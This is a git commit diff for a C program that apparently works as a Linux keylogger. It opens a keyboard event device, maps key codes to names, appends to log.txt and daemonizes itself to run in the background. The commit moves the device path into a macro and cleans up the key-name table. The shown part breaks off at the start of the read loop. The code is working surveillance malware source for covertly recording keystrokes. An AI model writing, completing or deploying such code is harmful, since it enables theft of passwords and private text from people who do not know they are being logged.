d8c0962fc9e2623f5dd267a1c14c99606995952e
Alvaro Santana <alvaro.santana23@gmail.com>
2020-10-31 14:48:25 -0600

    Final keyboard code corrections

--- main.c
+++ main.c
@@ -5,7 +5,11 @@
 #include <sys/stat.h>
 #include "daemonize.c"
 
-static const char *teclado[] =
+//The keyboard open varies from OS to OS - it might be event2 or event3
+
+#define EVENTNUMBER "/dev/input/event3"
+
+static const char *teclado[] = //Codigos obtenidos de /usr/include/linux/input-event-codes.h
 {
     "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
     "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
@@ -13,18 +17,18 @@ static const char *teclado[] =
     "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
     "n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
     "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
-    "SCROLL_LOCK", "NUMPAD_7", "NUMPAD_8", "NUMPAD_9", "-", "NUMPAD_4", "NUMPAD5",
-    "NUMPAD_6", "+", "NUMPAD_1", "NUMPAD_2", "NUMPAD_3", "INS", "DEL", "UK", "UK", "UK",
-    "F11", "F12", "UK", "UK",    "UK", "UK",    "UK", "UK", "UK", "R_ENTER", "R_CTRL", "/", 
-    "PRT_SCR", "R_ALT", "UK", "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
-    "DOWN",    "PAGE_DOWN", "INSERT", "DELETE", "UK", "UK", "UK", "UK","UK", "UK", "UK", 
+    "SCROLL_LOCK", "NUMPAD_7", "NUMPAD_8", "NUMPAD_9", "-", "NUMPAD_4", "NUMPAD_5",
+    "NUMPAD_6", "+", "NUMPAD_1", "NUMPAD_2", "NUMPAD_3", "INS", "DEL", "ALTLAYOUT", "ALTLAYOUT", "ALTLAYOUT",
+    "F11", "F12", "ALTLAYOUT", "ALTLAYOUT",    "ALTLAYOUT", "ALTLAYOUT",    "ALTLAYOUT", "ALTLAYOUT", "ALTLAYOUT", "R_ENTER", "R_CTRL", "/", 
+    "PRT_SCR", "R_ALT", "ALTLAYOUT", "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
+    "DOWN",    "PAGE_DOWN", "INSERT", "DELETE", "ALTLAYOUT", "ALTLAYOUT", "ALTLAYOUT", "ALTLAYOUT","ALTLAYOUT", "ALTLAYOUT", "ALTLAYOUT", 
     "PAUSE"
 };
 
 int main(int argc, char **argv)
 {
     struct input_event ev;
-    int keyboard = open("/dev/input/event2", O_RDONLY);
+    int keyboard = open(EVENTNUMBER, O_RDONLY);
     FILE *fp = fopen("log.txt", "a");
     daemonize();
     while (1)
